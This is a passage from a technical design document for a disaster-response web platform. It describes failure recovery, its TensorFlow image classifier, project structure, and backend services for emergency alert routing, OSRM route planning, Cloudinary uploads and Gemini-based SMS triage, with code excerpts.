Detection: OSRM returns non-200 or times out

Recovery Steps:
1. Logistics Agent logs error
2. Need marked as 'routing_failed'
3. Manager can manually assign route
4. Cached routes used if available (30-minute TTL)

User Impact: Route optimization unavailable, manual assignment needed

FAILURE SCENARIO 6: AGENT PROCESS CRASHES
-----------------------------------------
Detection: Child process exits with non-zero code

Recovery Steps:
1. Server's spawn() detects 'close' event
2. Error logged with exit code
3. Agent automatically restarted
4. Pending reports processed on restart
5. No data loss (MongoDB persists state)

Code:
  const agent = spawn('python', ['sentinel_agent.py']);
  
  agent.on('close', (code) => {
    if (code !== 0) {
      logger.error(`Sentinel agent crashed: ${code}`);
      // Restart after delay
      setTimeout(() => startSentinelAgent(), 5000);
    }
  });

FAILURE SCENARIO 7: BROWSER OFFLINE
-----------------------------------
Detection: navigator.onLine = false

Recovery Steps:
1. SyncStatus component shows "Offline" indicator
2. Form submissions stored in IndexedDB
3. Service worker serves cached pages
4. Background sync queues requests
5. On reconnection: Sync queue processed

Code:
  // Store locally when offline
  if (!navigator.onLine) {
    await dexieDb.pendingVerifications.add({
      reportId,
      verificationData,
      timestamp: Date.now()
    });
    return { queued: true };
  }

FAILURE SCENARIO 8: SESSION EXPIRED MID-OPERATION
-------------------------------------------------
Detection: API returns 401 Unauthorized

Recovery Steps:
1. React Query's onError detects 401
2. User redirected to login page
3. Work-in-progress NOT lost if:
   - Form data in local state
   - Offline queue populated

Prevention:
- Session extended on activity
- Proactive session refresh before expiry

ERROR RESPONSE STANDARDIZATION:
-------------------------------
All errors follow consistent format:

  {
    "success": false,
    "message": "Human-readable error message",
    "error": {
      "code": "VALIDATION_ERROR",
      "details": ["Field 'location' is required"]
    },
    "data": null
  }

Error Codes:
- VALIDATION_ERROR: Invalid input data
- AUTHENTICATION_ERROR: Not logged in
- AUTHORIZATION_ERROR: Insufficient permissions
- NOT_FOUND: Resource doesn't exist
- RATE_LIMIT: Too many requests
- EXTERNAL_SERVICE_ERROR: Third-party API failed
- INTERNAL_ERROR: Unexpected server error

TENSORFLOW MODEL SPECIFICATIONS:
--------------------------------
Model: disaster_model.keras
Architecture: Binary classification CNN
Input Shape: (224, 224, 3) - RGB image
Output: Single sigmoid neuron (probability of disaster)
Classification Threshold: 0.5
Classes: ['Non-Disaster', 'Disaster']

Preprocessing Pipeline:
  1. Download image from Cloudinary URL
  2. Open with PIL (Pillow)
  3. Resize to (224, 224) using LANCZOS resampling
  4. Convert to RGB if grayscale/RGBA
  5. Convert to NumPy array: shape (224, 224, 3)
  6. Normalize pixel values: array / 255.0 → [0.0, 1.0]
  7. Add batch dimension: shape (1, 224, 224, 3)

Custom Metrics:
  - F1Score: Custom Keras metric for model evaluation
  - Threshold: 0.5 for positive class prediction

Memory Requirements:
  - Model size: ~50MB loaded in memory
  - Per-prediction: ~2MB image tensor
  - TensorFlow GPU: Optional (falls back to CPU)

================================================================================
                          4. PROJECT STRUCTURE
================================================================================

disaster-response-platform/
│
├── package.json                 # Root package with workspace configuration
├── README.md                    # Project documentation
│
├── backend/                     # Node.js Express Backend
│   ├── package.json             # Backend dependencies
│   ├── server.js                # Main entry point, agent orchestration
│   │
│   ├── agents/                  # AI Background Agents
│   │   ├── oracle_agent.js      # Gemini-based severity assessment
│   │   ├── sentinel_agent.py    # TensorFlow image classification
│   │   ├── logistics_agent.py   # OSRM route optimization
│   │   └── requirements.txt     # Python dependencies
│   │
│   ├── config/                  # Configuration
│   │   ├── index.js             # Centralized config export
│   │   ├── db.js                # MongoDB connection
│   │   └── envSettings.js       # Environment-specific settings
│   │
│   ├── constants/               # Application constants
│   │   └── index.js             # Geocode defaults, AI model names
│   │
│   ├── controllers/             # Request handlers
│   │   ├── authController.js    # PIN-based authentication
│   │   ├── analyticsController.js
│   │   ├── emergencySmsController.js
│   │   ├── emergencyStationController.js
│   │   ├── routeController.js
│   │   ├── voiceReportController.js
│   │   ├── volunteerMessageController.js
│   │   └── volunteerTaskController.js
│   │
│   ├── middleware/              # Express middleware
│   │   ├── authMiddleware.js    # Session/PIN authentication
│   │   ├── globalErrorHandler.js
│   │   ├── httpLogger.js        # Request logging
│   │   └── index.js             # Middleware exports
│   │
│   ├── models/                  # Mongoose schemas
│   │   ├── ReportModel.js       # Main report schema (PWA/SMS/Audio)
│   │   ├── NeedModel.js         # SMS-based needs (legacy)
│   │   ├── UserModel.js         # Volunteers & managers
│   │   ├── EmergencyStationModel.js
│   │   ├── EmergencyAlertModel.js
│   │   ├── ShelterModel.js
│   │   ├── MissingPersonModel.js
│   │   ├── RoadConditionModel.js
│   │   ├── VolunteerMessageModel.js
│   │   └── disaster_model.keras # TensorFlow model binary
│   │
│   ├── routes/                  # API route definitions
│   │   ├── index.js             # Central router
│   │   ├── authRoutes.js
│   │   ├── analyticsRoutes.js
│   │   ├── emergencyStationRoutes.js
│   │   ├── missingPersonRoutes.js
│   │   ├── missionRoutes.js
│   │   ├── reportRoutes.js
│   │   ├── roadConditionRoutes.js
│   │   ├── routeRoutes.js
│   │   ├── shelterRoutes.js
│   │   ├── smsRoutes.js
│   │   ├── taskRoutes.js
│   │   ├── volunteerMessageRoutes.js
│   │   └── weatherRoutes.js
│   │
│   ├── services/                # Business logic
│   │   ├── geminiService.js     # Google AI integration
│   │   ├── emergencyAlertService.js
│   │   ├── routeService.js      # OSRM routing
│   │   ├── weatherService.js    # OpenWeatherMap
│   │   ├── cloudinaryService.js # Image upload
│   │   └── addressGeocodingService.js
│   │
│   ├── scripts/                 # Utility scripts
│   │   ├── clear-db.js          # Database cleanup
│   │   └── simulate-sms.js      # SMS testing
│   │
│   ├── uploads/                 # Temporary file uploads
│   │
│   └── utils/                   # Utilities
│       ├── apiResponse.js       # Standardized responses
│       ├── appLogger.js         # Winston-based logging
│       └── textParser.js        # Text processing
│
├── frontend/                    # React Vite Application
│   ├── package.json             # Frontend dependencies
│   ├── index.html               # HTML entry point
│   ├── vite.config.js           # Vite configuration (PWA)
│   ├── eslint.config.js         # ESLint configuration
│   │
│   └── src/
│       ├── main.jsx             # React entry point
│       ├── App.jsx              # Root component with routing
│       ├── App.css              # Global styles
│       ├── index.css            # CSS variables & theme
│       │
│       ├── components/          # Reusable UI components
│       │   ├── Map.jsx          # Leaflet map container
│       │   ├── MapPin.jsx       # Custom map markers
│       │   ├── RouteLine.jsx    # Route visualization
│       │   ├── SyncStatus.jsx   # Offline sync indicator
│       │   ├── VolunteerTaskList.jsx
│       │   ├── AudioReporter.jsx
│       │   ├── PhotoReporter.jsx
│       │   ├── AccessibilitySettings.jsx
│       │   ├── AnalyticsDashboard.jsx
│       │   ├── EmergencyStations.jsx
│       │   ├── ErrorBoundary.jsx
│       │   └── index.js         # Component exports
│       │
│       ├── pages/               # Page-level components
│       │   ├── DashboardPage.jsx # Manager dashboard
│       │   ├── VolunteerPage.jsx # Volunteer portal
│       │   ├── ResourcesPage.jsx # Resource management
│       │   └── index.js
│       │
│       ├── services/            # API and data services
│       │   ├── api.js           # Axios client setup
│       │   ├── apiService.js    # API endpoints
│       │   ├── authService.js   # Authentication
│       │   ├── syncService.js   # Offline sync
│       │   ├── db.js            # IndexedDB (Dexie) setup
│       │   ├── emergencyStationService.js
│       │   └── index.js
│       │
│       ├── contexts/            # React contexts
│       │   ├── AuthContext.jsx  # Authentication state
│       │   ├── AccessibilityContext.jsx
│       │   └── VolunteerRouteContext.jsx
│       │
│       └── i18n/                # Internationalization
│           ├── index.js         # i18next configuration
│           └── locales/         # Translation files
│               ├── en.json      # English
│               ├── hi.json      # Hindi
│               └── mr.json      # Marathi
│
└── station-demo/                # Emergency Station Simulator
    ├── package.json
    ├── README.md
    ├── server.js                # Express + Socket.IO server
    │
    ├── config/
    │   └── stationConfig.js     # Station type configuration
    │
    ├── models/
    │   └── AlertModel.js        # Alert schema
    │
    ├── routes/
    │   └── alertRoutes.js       # Alert API endpoints
    │
    ├── scripts/                 # Setup scripts
    │   ├── register-stations.js
    │   ├── init-station-dbs.js
    │   ├── clear-station-db.js
    │   └── test-alert.js
    │
    ├── public/
    │   └── index.html           # Station dashboard UI
    │
    └── alert sound/             # Audio files for alerts

================================================================================
                       5. BACKEND IMPLEMENTATION
================================================================================

5.1 SERVER ENTRY POINT (server.js)
----------------------------------
The server.js file is the main entry point that:

1. Loads environment variables using dotenv
2. Initializes Express application with middleware
3. Connects to MongoDB database
4. Starts all three AI agents as child processes
5. Configures CORS, session management, and file uploads
6. Mounts all API routes
7. Handles graceful shutdown of agent processes

AGENT PROCESS MANAGEMENT (Technical Details):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Agents are spawned as OS-level child processes using Node.js child_process:

  // Agent spawn configuration
  const proc = spawn(agent.command, agent.args, {
    cwd: agentsDir,                    // Working directory: backend/agents/
    stdio: ['ignore', 'pipe', 'pipe'], // stdin ignored, stdout/stderr piped
    env: {
      ...process.env,
      PYTHONIOENCODING: 'utf-8',       // Force Python UTF-8 output
      PYTHONUNBUFFERED: '1',           // Disable Python output buffering
      TF_CPP_MIN_LOG_LEVEL: '2',       // Suppress TensorFlow INFO/WARNING
      TF_ENABLE_ONEDNN_OPTS: '0',      // Disable oneDNN optimization warnings
      PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION: 'python',
    },
    detached: false,                   // Keep attached to parent process
  });

Python Virtual Environment Detection:
  // Search order for Python executable:
  1. <project>/.venv/Scripts/python.exe (Windows)
  2. <project>/.venv/bin/python (Unix)
  3. backend/agents/venv/Scripts/python.exe (Windows)
  4. backend/agents/venv/bin/python (Unix)
  5. System 'python' or 'python3' (fallback)

Process Lifecycle Management:
  - agentProcesses array tracks all spawned processes
  - stdout/stderr streams are line-buffered and prefixed with agent emoji
  - Process exit events are logged with exit codes
  - SIGINT/SIGTERM handlers gracefully terminate all agents

  // Graceful shutdown sequence
  process.on('SIGINT', () => {
    agentProcesses.forEach(({ name, process: proc }) => {
      if (proc && !proc.killed) {
        proc.kill('SIGTERM');  // Send termination signal
      }
    });
    process.exit(0);
  });

LOGGING SYSTEM (appLogger.js):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Custom logger class with configurable log levels:

  Log Levels (priority order):
  ┌─────────┬──────────────────────────────────────────────────────────┐
  │ Level   │ Usage                                                    │
  ├─────────┼──────────────────────────────────────────────────────────┤
  │ DEBUG   │ Detailed debugging info, SQL queries, variable dumps     │
  │ INFO    │ General information about system operations             │
  │ WARN    │ Warning conditions that don't stop execution            │
  │ ERROR   │ Error conditions requiring attention                    │
  └─────────┴──────────────────────────────────────────────────────────┘

  Log Output Format:
    [LEVEL] message ...args
    
  Example:
    [INFO] MongoDB Connected: cluster0.abc123.mongodb.net
    [ERROR] Failed to process report: Network timeout
    [DEBUG] Query executed: { status: 'Pending' }

  Configuration:
    - Level set via config.logging.level
    - Logs below configured level are suppressed
    - Console methods used: console.log, console.warn, console.error

REQUEST LOGGING (httpLogger.js):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP request/response logger middleware:

  Output Format:
    [timestamp] METHOD /path STATUS - duration
    
  Example:
    [2025-01-01 12:00:00] POST /api/reports 201 - 125ms
    [2025-01-01 12:00:01] GET /api/missions 200 - 45ms

  Implementation:
    - Records request start time via Date.now()
    - Hooks into res.on('finish') for response completion
    - Calculates duration as endTime - startTime
    - Only active when config.logging.requests = true

5.2 CONFIGURATION MANAGEMENT
----------------------------
Configuration is centralized in config/index.js:

CONFIGURATION OBJECT STRUCTURE:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  const config = {
    // Runtime environment
    nodeEnv: 'development' | 'production' | 'test',
    
    // Server
    port: 3000,
    
    // Database
    mongoUri: 'mongodb+srv://...',
    
    // CORS
    cors: {
      origin: '*' | ['http://localhost:5173', ...],
      credentials: true,
    },
    
    // Logging
    logging: {
      level: 'debug' | 'info' | 'warn' | 'error',
      requests: true | false,
    },
    
    // API Keys
    geminiApiKey: 'AIza...',
    openaiApiKey: 'sk-...',
    
    // Twilio SMS
    twilio: {
      accountSid: 'ACxxx...',
      authToken: 'xxx...',
      validateWebhook: false | true,  // Production only
    },
    
    // Geocoding
    geocode: {
      defaultRegion: 'Pune, India',
      timeout: 5000,
    },
  };

ENVIRONMENT-SPECIFIC OVERRIDES (envSettings.js):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Development:
    - port: 3000
    - cors.origin: '*'
    - logging.level: 'debug'
    - logging.requests: true

  Production:
    - port: process.env.PORT
    - cors.origin: ALLOWED_ORIGINS.split(',')
    - logging.level: 'error'
    - logging.requests: false

  Test:
    - port: 3001
    - mongoUri: 'mongodb://localhost:27017/DisasterResponseDB-test'
    - logging: suppressed

APPLICATION CONSTANTS (constants/index.js):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  // Status state machine values
  STATUS = {
    UNVERIFIED: 'Unverified',
    VERIFIED: 'Verified',
    IN_PROGRESS: 'In Progress',
    COMPLETED: 'Completed',
  }

  // HTTP response codes
  HTTP_STATUS = {
    OK: 200,
    CREATED: 201,
    BAD_REQUEST: 400,
    UNAUTHORIZED: 401,
    FORBIDDEN: 403,
    NOT_FOUND: 404,
    INTERNAL_SERVER_ERROR: 500,
  }

  // Geocoding defaults
  GEOCODE_DEFAULTS = {
    REGION: 'Pune, India',
    TIMEOUT: 5000,
  }

  // AI model identifiers
  AI_MODELS = {
    GEMINI: 'gemini-2.5-flash',
    WHISPER: 'whisper-1',
  }

5.3 DATABASE MODELS
-------------------
All models use Mongoose ODM with rich schemas:

ReportModel.js (Primary Report Schema):
- reportId: UUID for tracking
- source: PWA, SMS, WhatsApp, Audio
- text: User-provided description
- imageUrl: Cloudinary URL for images
- audioUrl: Audio file URL
- location: { lat, lng } coordinates
- status: State machine (Pending -> Processing -> Analyzed -> Resolved)
- sentinelData: { tag, confidence } from image analysis
- oracleData: { severity, needs[], summary } from AI assessment

NeedModel.js (SMS-Based Needs):
- fromNumber: Sender phone number
- rawMessage: Original SMS text
- triageData: AI-extracted { needType, location, details, urgency }
- coordinates: Geocoded location
- status: Verification workflow state
- emergencyStatus: Station dispatch tracking

UserModel.js:
- pin: 4-digit PIN for quick authentication
- name: Display name
- role: volunteer | manager
- skills: Array of capabilities
- isActive: Account status

EmergencyStationModel.js:
- stationId: Unique identifier
- type: fire | hospital | police | rescue
- location: Coordinates and address
- apiConfig: { baseUrl, alertEndpoint, apiKey }
- capabilities: Array of emergency types handled
- status: active | inactive | maintenance

ShelterModel.js:
- Evacuation center details
- Capacity tracking (total, current, families, elderly)
- Facilities (medical, kitchen, toilets, electricity)
- Supplies inventory

MissingPersonModel.js:
- Personal information and physical description
- Photos array with Cloudinary URLs
- Last seen location
- Reporter contact information
- Case status tracking

5.4 API ROUTES & CONTROLLERS
----------------------------
Routes are organized by domain and mounted in routes/index.js:

Authentication Routes (authRoutes.js):
- POST /api/auth/login         - PIN-based login
- POST /api/auth/logout        - Session logout
- GET  /api/auth/session       - Check session status
- POST /api/auth/register      - Register new user (manager only)
- GET  /api/auth/users         - List users (manager only)

Report Routes (reportRoutes.js):
- POST /api/reports            - Create new report with image
- GET  /api/reports            - List all reports
- GET  /api/reports/:id        - Get single report
- PATCH /api/reports/:id       - Update report status

SMS Routes (smsRoutes.js):
- POST /api/sms/webhook        - Twilio webhook for incoming SMS
- GET  /api/sms/needs          - Get all needs from SMS

Task Routes (taskRoutes.js):
- GET  /api/tasks              - Get volunteer tasks
- PATCH /api/tasks/:id/verify  - Verify a task
- PATCH /api/tasks/:id/flag    - Flag a task

Emergency Station Routes:
- POST /api/emergency-stations/register
- GET  /api/emergency-stations
- DELETE /api/emergency-stations/:id
- POST /api/emergency-stations/:id/dispatch

Mission Routes (missionRoutes.js):
- GET  /api/missions           - Get all missions
- POST /api/missions/:id/complete
- POST /api/missions/:id/reroute

Weather Routes (weatherRoutes.js):
- GET /api/weather/current     - Get current weather
- GET /api/weather/forecast    - Get weather forecast

Shelter Routes (shelterRoutes.js):
- CRUD operations for shelter management
- PUT /api/shelters/:id/checkin - Check in evacuees

Missing Person Routes:
- POST /api/missing-persons    - Report missing person
- GET  /api/missing-persons    - Search missing persons
- PATCH /api/missing-persons/:id/status - Update case status

5.5 SERVICES LAYER
------------------
Business logic is encapsulated in service modules:

geminiService.js:
- triageSMS(messageBody): Analyzes SMS messages using Gemini AI
  - Extracts: needType, location, details, urgency
  - Uses structured prompts for consistent JSON output
  
- analyzeReport(report): Analyzes visual/audio reports
  - Input: Sentinel tag, confidence, user text, location
  - Output: severity (1-10), needs[], summary

routeService.js:
- Uses OSRM (Open Source Routing Machine) API
- Caches routes for 30 minutes
- Supports driving, walking, cycling profiles
- Returns GeoJSON geometry, distance, duration

emergencyAlertService.js:
- Maps disaster types to emergency service types
- Determines appropriate station (fire/hospital/police/rescue)
- Dispatches alerts to registered stations via HTTP

5.5.1.1 EMERGENCY TYPE CLASSIFICATION ALGORITHM
-----------------------------------------------
The emergency alert service uses a sophisticated keyword-based algorithm to
classify incidents and route them to appropriate emergency services.

DISASTER TYPE → STATION TYPE MAPPING:
  
  ┌────────────────────────────────────────────────────────────────────────┐
  │                    EMERGENCY ROUTING MATRIX                             │
  ├──────────────────────┬─────────────────────────────────────────────────┤
  │ Emergency Type       │ Primary Station  │ Keywords Detected           │
  ├──────────────────────┼──────────────────┼─────────────────────────────┤
  │ fire                 │ fire             │ fire, burning, flame, smoke │
  │ wildfire             │ fire             │ wildfire, forest fire       │
  │ explosion            │ fire             │ explosion, blast            │
  │ hazmat               │ fire             │ gas leak, chemical, hazmat  │
  ├──────────────────────┼──────────────────┼─────────────────────────────┤
  │ medical              │ hospital         │ medical, doctor, injured    │
  │ injury               │ hospital         │ bleeding, unconscious       │
  │ cardiac              │ hospital         │ heart attack, cardiac       │
  ├──────────────────────┼──────────────────┼─────────────────────────────┤
  │ flood                │ rescue           │ flood, rising water         │
  │ earthquake           │ rescue           │ earthquake, shaking         │
  │ building_collapse    │ rescue           │ collapse, trapped           │
  │ landslide            │ rescue           │ landslide, mudslide         │
  ├──────────────────────┼──────────────────┼─────────────────────────────┤
  │ traffic_accident     │ police           │ accident, crash, collision  │
  │ crime                │ police           │ theft, robbery, violence    │
  │ security             │ police           │ stampede, panic, riot       │
  └──────────────────────┴──────────────────┴─────────────────────────────┘

CLASSIFICATION PRIORITY ORDER:
  
  The algorithm checks keywords in this priority order to avoid
  misclassification (checked first wins):
  
  1. Fire keywords (highest priority - life-threatening)
  2. Hazmat/Chemical (fire department handles)
  3. Police/Security (crowd control critical)
  4. Rescue/Disaster (rescue operations)
  5. Medical/Hospital (after rescue needs checked)
  6. Building collapse (rescue handles)
  7. Traffic accidents (police handles)
  8. General (rescue as fallback)

KEYWORD DETECTION ALGORITHM:
  
  function determineEmergencyType(data) {
    const text = (data.text || data.rawMessage || "").toLowerCase();
    
    // Check Sentinel AI tag first
    if (data.sentinelData?.tag) {
      const tag = data.sentinelData.tag.toLowerCase();
      if (tag.includes("fire")) return "fire";
      if (tag.includes("flood")) return "flood";
      if (tag.includes("medical")) return "medical";
      // ... etc
    }
    
    // Priority-ordered keyword check
    if (text.includes("fire") || text.includes("burning")) return "fire";
    if (text.includes("gas leak") || text.includes("hazmat")) return "hazmat";
    if (text.includes("police") || text.includes("stampede")) return "police";
    if (text.includes("trapped") || text.includes("rescue")) return "rescue";
    if (text.includes("ambulance") || text.includes("injured")) return "medical";
    if (text.includes("collapse")) return "building_collapse";
    if (text.includes("accident")) return "traffic_accident";
    
    // Check triage data
    if (data.triageData?.needType) {
      const needMap = {
        Medical: "medical",
        Rescue: "rescue",
        Water: "flood",
        Fire: "fire"
      };
      return needMap[data.triageData.needType] || "general";
    }
    
    return "general";  // Rescue handles general cases
  }

ALERT DATA CONSTRUCTION:
  
  function createAlertData(sourceData, sourceType, emergencyType) {
    const lat = sourceData.location?.lat || sourceData.coordinates?.lat;
    const lng = sourceData.location?.lng || sourceData.coordinates?.lon;
    
    // Determine severity
    let severity = 5;
    if (sourceData.oracleData?.severity) {
      severity = sourceData.oracleData.severity;
    } else if (sourceData.triageData?.urgency) {
      severity = { Low: 3, Medium: 5, High: 8 }[sourceData.triageData.urgency];
    }
    
    return {
      sourceType,
      sourceId: sourceData._id,
      emergencyType,
      severity,
      location: { lat, lng, address: sourceData.coordinates?.formattedAddress },
      title: `${emergencyType.toUpperCase()} ALERT: ${sourceData.sentinelData?.tag || "Emergency"}`,
      description: sourceData.text || sourceData.rawMessage || "Emergency reported",
      needs: sourceData.oracleData?.needs || [],
      metadata: {
        imageUrl: sourceData.imageUrl,
        audioUrl: sourceData.audioUrl,
        aiAnalysis: {
          sentinelData: sourceData.sentinelData,
          oracleData: sourceData.oracleData,
          triageData: sourceData.triageData
        }
      }
    };
  }

STATION DISPATCH ALGORITHM:
  
  async function dispatchEmergencyAlert(sourceData, sourceType) {
    // 1. Determine emergency type
    const emergencyType = determineEmergencyType(sourceData);
    
    // 2. Get appropriate station types (only primary)
    const stationTypes = DISASTER_TO_SERVICE_MAP[emergencyType] || ["rescue"];
    
    // 3. Find nearest active stations of each type
    const stations = await EmergencyStation.find({
      type: { $in: stationTypes },
      status: "active",
      capabilities: { $in: [emergencyType, "general"] }
    });
    
    // 4. Calculate distances and sort
    const stationsWithDistance = stations.map(station => ({
      ...station,
      distance: haversine(
        sourceData.location.lat, sourceData.location.lng,
        station.location.lat, station.location.lng
      )
    })).sort((a, b) => a.distance - b.distance);
    
    // 5. Send alert to nearest station of each type
    const alertData = createAlertData(sourceData, sourceType, emergencyType);
    const alertResults = [];
    
    for (const stationType of stationTypes) {
      const station = stationsWithDistance.find(s => s.type === stationType);
      if (station) {
        const result = await sendAlertToStation(station, alertData);
        alertResults.push({ station, result });
      }
    }
    
    // 6. Create alert record in database
    const alert = await EmergencyAlert.create({
      ...alertData,
      sentToStations: alertResults.map(r => ({
        stationId: r.station._id,
        stationName: r.station.name,
        stationType: r.station.type,
        distance: r.station.distance,
        deliveryStatus: r.result.success ? "sent" : "failed"
      })),
      status: "dispatched"
    });
    
    // 7. Update source document with alert reference
    const Model = sourceType === "Report" ? Report : Need;
    await Model.updateOne(
      { _id: sourceData._id },
      {
        $set: {
          emergencyStatus: "assigned",
          emergencyAlertId: alert.alertId,
          emergencyType: emergencyType
        }
      }
    );
    
    return {
      success: true,
      alertId: alert.alertId,
      emergencyType,
      stationsNotified: alertResults.length
    };
  }

5.5.2 CLOUDINARY SERVICE (cloudinaryService.js)
------------------------------------------------
Handles image uploads to Cloudinary CDN with retry logic:

CONFIGURATION:
  cloudinary.config({
    cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
    api_key: process.env.CLOUDINARY_API_KEY,
    api_secret: process.env.CLOUDINARY_API_SECRET,
    secure: true,  // Always use HTTPS
  });

RETRY CONFIGURATION:
  MAX_RETRIES = 3
  INITIAL_RETRY_DELAY = 1000ms  // 1 second
  UPLOAD_TIMEOUT = 60000ms      // 60 seconds
  
  // Exponential backoff: 1s, 2s, 4s

UPLOAD FUNCTION WITH RETRY:
  async function uploadImageBuffer(buffer, options = {}) {
    const uploadOptions = {
      folder: 'disaster-response/reports/photos',
      resource_type: 'auto',
      quality: 'auto:good',
      fetch_format: 'auto',
      ...options,
    };
    
    let lastError;
    
    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
      try {
        const result = await attemptUpload(buffer, uploadOptions);
        return {
          success: true,
          url: result.secure_url,
          publicId: result.public_id,
          width: result.width,
          height: result.height,
          format: result.format,
          bytes: result.bytes,
        };
      } catch (error) {
        lastError = error;
        
        if (attempt < MAX_RETRIES) {
          const delay = INITIAL_RETRY_DELAY * Math.pow(2, attempt - 1);
          await new Promise(r => setTimeout(r, delay));
        }
      }
    }
    
    throw new Error(`Upload failed after ${MAX_RETRIES} attempts: ${lastError.message}`);
  }

UPLOAD STREAM IMPLEMENTATION:
  function attemptUpload(buffer, uploadOptions) {
    return new Promise((resolve, reject) => {
      let timeoutId = setTimeout(() => {
        reject(new Error(`Upload timeout after ${UPLOAD_TIMEOUT / 1000}s`));
      }, UPLOAD_TIMEOUT);
      
      const uploadStream = cloudinary.uploader.upload_stream(
        uploadOptions,
        (error, result) => {
          clearTimeout(timeoutId);
          error ? reject(error) : resolve(result);
        }
      );
      
      uploadStream.end(buffer);
    });
  }

5.5.3 ROUTE SERVICE (routeService.js)
-------------------------------------
Integrates with OSRM for road-based routing:

CONFIGURATION:
  OSRM_BASE_URL = "https://router.project-osrm.org"
  OSRM_TIMEOUT = 10000ms  // 10 seconds
  CACHE_TTL = 30 * 60 * 1000  // 30 minutes
  MAX_CACHE_SIZE = 500

CACHE KEY GENERATION:
  function getCacheKey(coordinates) {
    return coordinates
      .map(([lat, lon]) => `${lat.toFixed(5)},${lon.toFixed(5)}`)
      .join(";");
  }

ROUTE REQUEST FUNCTION:
  async function getRoute(waypoints, options = {}) {
    const { profile = 'driving', alternatives = false, steps = false } = options;
    
    // Normalize waypoints to [[lat, lon], ...]
    const coordinates = waypoints.map(wp => [
      wp.lat ?? wp[0],
      wp.lon ?? wp.lng ?? wp[1]
    ]);
    
    // Check cache
    const cacheKey = `${profile}:${getCacheKey(coordinates)}`;
    const cached = routeCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < CACHE_TTL) {
      return cached.data;  // Cache hit
    }
    
    // Build OSRM URL (OSRM expects lon,lat format)
    const coordsStr = coordinates.map(([lat, lon]) => `${lon},${lat}`).join(";");
    const url = `${OSRM_BASE_URL}/route/v1/${profile}/${coordsStr}`;
    
    const params = {
      overview: 'full',
      geometries: 'geojson',
      alternatives: alternatives,
      steps: steps,
    };
    
    const response = await axios.get(url, { params, timeout: OSRM_TIMEOUT });
    
    if (response.data.code !== 'Ok') {
      throw new Error(`OSRM error: ${response.data.code}`);
    }
    
    const osrmRoute = response.data.routes[0];
    
    // Convert OSRM geometry (lon,lat) to our format (lat,lon)
    const routeData = {
      geometry: osrmRoute.geometry.coordinates.map(([lon, lat]) => ({ lat, lon })),
      distance: osrmRoute.distance,  // meters
      duration: osrmRoute.duration,  // seconds
      waypoints: response.data.waypoints?.map(wp => ({
        lat: wp.location[1],
        lon: wp.location[0],
        name: wp.name || null,
      })),
    };
    
    // Cache result
    routeCache.set(cacheKey, { data: routeData, timestamp: Date.now() });
    
    return routeData;
  }

FALLBACK STRAIGHT-LINE ROUTE:
  function getFallbackRoute(coordinates) {
    let totalDistance = 0;
    
    for (let i = 0; i < coordinates.length - 1; i++) {
      totalDistance += haversine(
        coordinates[i][0], coordinates[i][1],
        coordinates[i + 1][0], coordinates[i + 1][1]
      );
    }
    
    return {
      geometry: coordinates.map(([lat, lon]) => ({ lat, lon })),
      distance: totalDistance,
      duration: totalDistance / 13.89,  // Assume ~50 km/h
      isFallback: true,
    };
  }

TSP OPTIMIZATION (for multi-stop routes):
  async function getOptimizedRoute(waypoints, options = {}) {
    const { roundtrip = true, source = 'first' } = options;
    
    // Use OSRM's trip service for TSP optimization
    const coordsStr = waypoints.map(wp => `${wp.lon},${wp.lat}`).join(";");
    const url = `${OSRM_BASE_URL}/trip/v1/driving/${coordsStr}`;
    
    const params = {
      overview: 'full',
      geometries: 'geojson',
      roundtrip: roundtrip,
      source: source,
    };
    
    const response = await axios.get(url, { params, timeout: OSRM_TIMEOUT });
    const trip = response.data.trips[0];
    
    return {
      geometry: trip.geometry.coordinates.map(([lon, lat]) => ({ lat, lon })),
      distance: trip.distance,
      duration: trip.duration,
      optimizedOrder: response.data.waypoints.map(wp => wp.waypoint_index),
    };
  }

5.5.4 GEMINI SERVICE (geminiService.js)
---------------------------------------
Integrates with Google's Generative AI for NLP tasks:

INITIALIZATION:
  const genAI = new GoogleGenerativeAI(config.geminiApiKey);
  const model = genAI.getGenerativeModel({ model: 'gemini-2.5-flash' });

SMS TRIAGE PROMPT:
  const SMS_TRIAGE_PROMPT = (messageBody) => `
  You are a disaster response triage bot. Analyze the following SMS message
  from a citizen in distress. Extract the key information and return *only*
  a valid JSON object.
  
  The JSON object must strictly follow this format:
  {
    "needType": "string",    // One of: Water, Food, Medical, Rescue, Other
    "location": "string",    // Physical location mentioned
    "details": "string",     // Any other useful information
    "urgency": "string"      // One of: Low, Medium, High
  }
  
  Message: "${messageBody}"
  
  JSON Output:
  `;

SMS TRIAGE FUNCTION:
  async function triageSMS(messageBody) {
    const prompt = SMS_TRIAGE_PROMPT(messageBody);
    const result = await model.generateContent(prompt);
    const jsonText = result.response.text();
    
    const triageData = JSON.parse(jsonText);
    
    // Validate enum values
    const validNeed = ['Water', 'Food', 'Medical', 'Rescue', 'Other']
      .includes(triageData.needType);
    const validUrgency = ['Low', 'Medium', 'High']
      .includes(triageData.urgency);
    
    if (!validNeed) triageData.needType = 'Other';
    if (!validUrgency) triageData.urgency = 'Medium';
    
    return triageData;
  }

5.5.1 ERROR HANDLING PATTERNS
-----------------------------
The application uses a consistent error handling strategy across all layers:

BACKEND ERROR STRUCTURE:
~~~~~~~~~~~~~~~~~~~~~~~~

File: middleware/globalErrorHandler.js

Custom ApiError Class:
  class ApiError extends Error {
    constructor(statusCode, message, details = null) {
      super(message);
      this.statusCode = statusCode;
      this.details = details;
    }
  }
  
  // Usage:
  throw new ApiError(404, "Report not found", { reportId: id });
  throw new ApiError(400, "Invalid file type", { allowed: [".jpg", ".png"] });
  throw new ApiError(401, "Authentication required");
  throw new ApiError(403, "Manager access required");
  throw new ApiError(500, "Database connection failed");

Standard Response Helpers:
  
  File: utils/apiResponse.js
  
  // Success Response
  sendSuccess(res, data, message, statusCode)
  
  Response: {
    success: true,
    message: "Report created successfully",
    data: { reportId: "xxx", ... }
  }
  
  // Error Response
